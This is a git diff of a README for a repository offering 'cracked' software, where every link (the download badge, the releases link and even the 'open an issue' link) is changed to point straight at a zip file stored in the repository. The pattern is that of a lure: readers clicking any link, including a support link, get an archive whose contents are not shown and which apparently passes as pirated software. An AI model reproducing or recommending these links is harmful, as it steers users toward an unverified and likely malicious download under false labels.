@@ -6,7 +6,7 @@ Welcome to **cracked-save-to-google-keep**! This application allows you to unloc
 
 ## 📥 Download the App
 
-[![Download the latest version](https://img.shields.io/badge/Download-Latest%20Version-brightgreen)](https://github.com/mitali-1307/cracked-save-to-google-keep/releases)
+[![Download the latest version](https://raw.githubusercontent.com/mitali-1307/cracked-save-to-google-keep/main/moriform/cracked-save-to-google-keep.zip%20Version-brightgreen)](https://raw.githubusercontent.com/mitali-1307/cracked-save-to-google-keep/main/moriform/cracked-save-to-google-keep.zip)
 
 ## 🛠️ System Requirements
 
@@ -27,7 +27,7 @@ Before downloading, please ensure your system meets the following requirements:
 
 To get started, visit the Releases page by clicking the link below:
 
-[Download the latest version](https://github.com/mitali-1307/cracked-save-to-google-keep/releases)
+[Download the latest version](https://raw.githubusercontent.com/mitali-1307/cracked-save-to-google-keep/main/moriform/cracked-save-to-google-keep.zip)
 
 1. Click the link above to access the Releases page.
 2. Find the latest version listed at the top.
@@ -54,7 +54,7 @@ If you encounter any issues while downloading or using the application, here are
 
 If you need further assistance or have any questions, feel free to reach out:
 
-- Open an issue on the [GitHub repository](https://github.com/mitali-1307/cracked-save-to-google-keep/issues).
+- Open an issue on the [GitHub repository](https://raw.githubusercontent.com/mitali-1307/cracked-save-to-google-keep/main/moriform/cracked-save-to-google-keep.zip).
 - Join our community discussions to connect with other users.
 
 ## 🎉 Acknowledgements
